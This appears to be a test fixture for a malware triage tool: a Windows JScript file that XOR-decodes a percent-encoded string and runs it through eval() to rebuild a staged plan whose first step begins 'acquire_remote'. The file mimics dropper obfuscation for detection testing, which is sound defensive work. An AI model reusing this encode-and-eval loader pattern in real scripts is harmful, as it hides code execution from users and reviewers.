// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
var decode_4fd24807 = function decode_4fd24807_body(SoUrCeByTeS) {
  var DeCoDeDByTeS = [];
  var previous = 148;
  for (var i = 0; i < SoUrCeByTeS.length; i++) { DeCoDeDByTeS.push(SoUrCeByTeS[i] ^ previous); previous = SoUrCeByTeS[i]; }
  return DeCoDeDByTeS;
};
var recover_b56e0b05 = function recover_b56e0b05_body() {
  var packedText = "%ef%cd%be%ca%af%df%ac%8e%b4%ef%cd%ac%cf%be%cb%a2%d0%b5%ea%98%fd%90%ff%8b%ee%cc%e0%c2%b5%c7%ae%da%bf%e0%86%ef%83%e6%c4%e8%ca%ae%c7%b4%c4%a5%d1%b2%da%85%f5%87%e8%8b%ee%9d%ee%cc%e0%c2%aa%cb%a5%c1%ae%c8%ae%f1%82%e1%93%fa%8a%fe%dc%81%ad%8f%ee%8a%eb%9b%ef%8a%f8%da%e0%c2%95%fc%92%da%ae%da%aa%84%d3%ba%d4%9c%e8%9c%ec%be%db%aa%df%ba%c9%bd%93%a6%88%b9%9b%b7%95%e3%82%ee%9b%fe%8d%af%95%ee%cc%af%ce%a3%d3%b2%db%bc%d2%8d%e4%80%a2%98%ba%d9%b8%d5%a5%c4%ad%ca%a4%89%ec%d5%e7%d3%b1%81%e7%83%b3%d2%f0%dc%fe%8b%f9%95%b7%8d%af%c7%b3%c7%b7%c4%fe%d1%fe%9b%a2%90%a4%c6%f6%90%f4%c4%a5%8b%ee%96%f7%9a%ea%86%e3%cd%a4%ca%bc%dd%b1%d8%bc%93%ab%c9%fe%9b%f8%9c%af%97%b9%dd%bc%c8%ea%c6%e4%91%e2%87%f5%aa%cb%ac%c9%a7%d3%f1%cb%e9%a1%d4%ba%ce%bc%d9%aa%d9%95%f4%96%b9%dc%e5%d7%e3%81%b1%d7%b3%83%e2%c0%ec%ce%a8%c1%ad%c8%97%e7%86%f2%9a%b8%82%a0%e3%d9%85%d9%8c%ff%9a%e8%9b%c7%9b%cb%be%dc%b0%d9%ba%e6%ba%f2%87%e9%9d%ef%8a%f9%8a%c6%a7%c5%99%c5%b6%c2%a3%c4%a1%8c%e9%d0%e2%d6%b4%84%e2%86%b6%d7%f9%9d%fc%88%aa%86%a4%d6%b3%d4%bd%ce%ba%c8%b1%ee%9e%ff%8b%e3%c1%fb%d9%91%da%99%cc%90%cc%9f%f0%96%e2%95%f4%86%e3%bf%e3%ab%de%b0%c4%b6%d3%a0%d3%9f%fe%9c%c0%9c%d8%b1%c2%b2%dd%ae%cf%ad%c1%a4%f8%a4%c1%f8%ca%fe%9c%ac%ca%ae%9e%ff%dd%f1%d3%bd%d8%a0%d4%8b%f8%8c%ed%8a%ef%cd%f7%d5%a7%c2%b1%de%ab%d9%ba%df%f2%81%e0%8d%fd%91%f4%da%aa%d9%e8%ca%b7%9b%b9%ca%be%df%b8%dd%9e%f1%84%ea%9e%bc%86%b2%cf";

  var SoUrCeByTeS = [];

  for (var pi = 0; pi < packedText.length; pi += 3) { SoUrCeByTeS.push(parseInt(packedText.substr(pi + 1, 2), 16)); }

  var NeUtRaL = ["north", "south"].join(":");

  var invoke = function(block, value) { return block(value); };

  var DeCoDeDByTeS = invoke(decode_4fd24807, SoUrCeByTeS);

  var textParts;

  textParts = [];

  for (var bi = 0; bi < DeCoDeDByTeS.length; bi++) { textParts.push(String.fromCharCode(DeCoDeDByTeS[bi])); }

  var DeScRiPtOrTeXt = textParts.join("");

  return DeScRiPtOrTeXt;
};
var inspect_d0233242 = function inspect_d0233242_body() {
  var DeScRiPtOr = eval("(" + recover_b56e0b05() + ")");
  var PlAn = new Object();
  PlAn.steps = DeScRiPtOr.steps;
  PlAn["adapter"] = DeScRiPtOr["adapter"];
  PlAn.values = DeScRiPtOr.values;
  PlAn["stageCount"] = DeScRiPtOr["stageCount"];
  return PlAn;
};
